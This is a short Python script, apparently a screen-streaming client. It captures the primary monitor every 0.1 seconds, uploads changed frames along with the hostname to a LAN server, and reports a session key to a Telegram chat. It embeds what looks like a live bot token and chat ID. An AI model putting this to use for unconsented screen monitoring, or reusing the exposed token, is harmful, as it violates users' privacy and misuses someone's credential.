import mss
import mss.tools
from PIL import Image
import io
import requests
import time
import argparse
import uuid
import socket

from telegram import Bot

DEFAULT_HOST = 'http://192.168.50.50:5000'
TELEGRAM_BOT_TOKEN = '5207577524:AAFWyFgWKd_yZCzSqiULfKNZ2GQb8yWI-h0'


def generate_unique_key():
    return str(uuid.uuid4())[:4]  # Generates a random UUID and takes the first 4 characters

async def send_key_to_telegram(key):
    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    chat_id = '984573662'  # Replace 'your_telegram_chat_id' with the actual chat ID
    await bot.send_message(chat_id=chat_id, text=f'New key generated: {key}')

def main(host=DEFAULT_HOST, key=None):
    if key is None:
        key = generate_unique_key()

    # Get the computer name
    computer_name = socket.gethostname()
    
    print(f'Sending key "{key}" to server at {host}')

    r = requests.post(f'{host}/new_session', json={'_key': key, 'computer_name': computer_name})  # Include computer name
    if r.status_code != 200:    
        print('Server not available.')
        return

    import asyncio
    asyncio.run(send_key_to_telegram(key))

    PREV_IMG = None
    with mss.mss() as sct:
        while True:
            # Get the size of the primary monitor
            monitor = sct.monitors[1]

            # Capture the screen
            screenshot = sct.grab(monitor)
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)

            with io.BytesIO() as image_data:
                img.save(image_data, 'PNG')
                image_data_content = image_data.getvalue()

            if image_data_content != PREV_IMG:
                files = {}
                filename = str(round(time.time()*1000))+'_'+key
                files[filename] = ('img.png', image_data_content, 'multipart/form-data')

                try:
                    r = requests.post(f'{host}/capture_post', files=files)
                except Exception as e:
                    pass

                PREV_IMG = image_data_content
            else:
                #print('no desktop change')
                pass

            time.sleep(0.1)

if __name__ == '__main__':
    main()
